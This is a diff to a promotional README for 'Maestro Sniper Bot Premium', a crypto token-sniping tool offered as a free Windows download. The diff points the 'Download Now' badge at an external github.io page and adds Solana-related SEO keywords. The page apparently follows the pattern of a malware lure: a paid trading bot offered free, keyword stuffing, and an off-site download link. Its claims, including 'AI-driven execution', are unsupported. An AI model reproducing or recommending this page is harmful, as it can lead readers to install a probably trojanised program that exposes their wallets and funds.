@@ -1,7 +1,7 @@
 # Maestro Sniper Bot Premium — Download Free for Windows
 Install Maestro Sniper Bot Premium today — the ultimate free sniping software for new token launches with multiple wallet support and AI-driven execution.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](#)
+[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://maestro-sniper-bot-premium.github.io/.github/)
 
 ---
 
@@ -66,5 +66,5 @@ While there are many bots on the market, Maestro combines unmatched execution sp
 ---
 
 ## 🔍 Tags  
-maestro sniper bot, maestro bot premium download, sniper bot crypto, maestro windows install, token sniper tool, free dex sniper bot, maestro sniper setup, maestro bot windows version, maestro bot download link, maestro ethereum sniper, maestro pancake sniper, maestro bot guide, sniper bot download free, dex sniper bot free
+maestro sniper bot, maestro bot premium download, sol sniper bot , maestro premium, token sniper tool, free dex sniper bot, maestro sniper setup, mastro sol sniper bot, maestro bot download link, maestro ethereum sniper, maestro pancake sniper, maestro bot guide, sniper bot download free, dex sniper bot free
 
